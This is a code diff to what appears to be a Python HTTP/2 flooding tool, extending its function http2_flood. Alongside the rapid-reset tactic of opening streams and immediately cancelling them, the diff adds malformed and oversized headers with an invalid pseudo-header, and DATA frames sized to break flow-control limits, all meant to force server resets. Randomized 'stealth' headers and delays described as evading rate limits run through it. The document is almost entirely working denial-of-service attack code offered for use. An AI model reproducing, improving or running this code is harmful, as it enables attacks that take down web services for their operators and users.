@@ -12,7 +12,7 @@ except ImportError:
 
 try:
     from hyper import HTTPConnection
-    from hyper.http20.frame import HeadersFrame, RstStreamFrame, SettingsFrame, GoAwayFrame
+    from hyper.http20.frame import HeadersFrame, RstStreamFrame, SettingsFrame, GoAwayFrame, DataFrame
     from hyper.http20.exceptions import HyperException
 except ImportError:
     print("⚠️ Hyper not installed. Run: pip3 install hyper")
@@ -40,7 +40,7 @@ STEALTH_HEADERS = [
     "X-Forwarded-For", "Referer", "Origin", "Cache-Control", "X-Real-IP"
 ]
 
-def stealth_http_headers():
+def stealth_http_headers(malformed=False):
     large_cookie = f"sessionid={os.urandom(16).hex()}; " + \
                    "; ".join(f"param{i}={os.urandom(random.randint(50, 100)).hex()}" for i in range(5)) + \
                    "; token=" + os.urandom(32).hex()
@@ -63,6 +63,11 @@ def stealth_http_headers():
         "cache-control": "no-cache",
         "pragma": "no-cache"
     }
+    
+    if malformed:
+        # Introduce invalid HPACK encoding or oversized headers
+        headers[":invalid-header"] = os.urandom(1024).hex()  # Invalid pseudo-header
+        headers["x-oversized"] = "A" * 8192  # Oversized header to trigger server reset
     return headers
 
 def get_socket():
@@ -211,15 +216,33 @@ def http2_flood(ip, port, duration, threads):
                     active_streams = 0
                     while active_streams < max_concurrent_streams and time.time() < end:
                         try:
-                            headers = stealth_http_headers()
-                            conn.request('GET', headers[':path'], headers=headers)
-                            rst_frame = RstStreamFrame(stream_ids[conn])
-                            rst_frame.error_code = 0x8
-                            conn._send_frame(rst_frame)
+                            # Randomly choose attack tactic
+                            tactic = random.choice(["client_reset", "malformed_frame", "flow_control_error"])
+                            
+                            if tactic == "client_reset":
+                                # Standard rapid-reset with client-initiated RST_STREAM
+                                headers = stealth_http_headers(malformed=False)
+                                conn.request('GET', headers[':path'], headers=headers)
+                                rst_frame = RstStreamFrame(stream_ids[conn])
+                                rst_frame.error_code = 0x8  # CANCEL
+                                conn._send_frame(rst_frame)
+                            elif tactic == "malformed_frame":
+                                # Send malformed headers to trigger server RST_STREAM
+                                headers = stealth_http_headers(malformed=True)
+                                conn.request('GET', headers[':path'], headers=headers)
+                                # No client RST_STREAM; expect server to reset
+                            elif tactic == "flow_control_error":
+                                # Send DATA frame exceeding flow control window
+                                headers = stealth_http_headers(malformed=False)
+                                conn.request('GET', headers[':path'], headers=headers)
+                                # Send oversized DATA frame to trigger server reset
+                                data_frame = DataFrame(stream_ids[conn])
+                                data_frame.data = os.urandom(16384)  # Exceed typical window size
+                                conn._send_frame(data_frame)
+
                             stream_ids[conn] += 2
                             active_streams += 1
-                            # Random delay to evade rate-limiting
-                            time.sleep(random.uniform(0.005, 0.05))
+                            time.sleep(random.uniform(0.005, 0.05))  # Random delay to evade rate-limiting
                         except HyperException as e:
                             if "GOAWAY" in str(e):
                                 try:
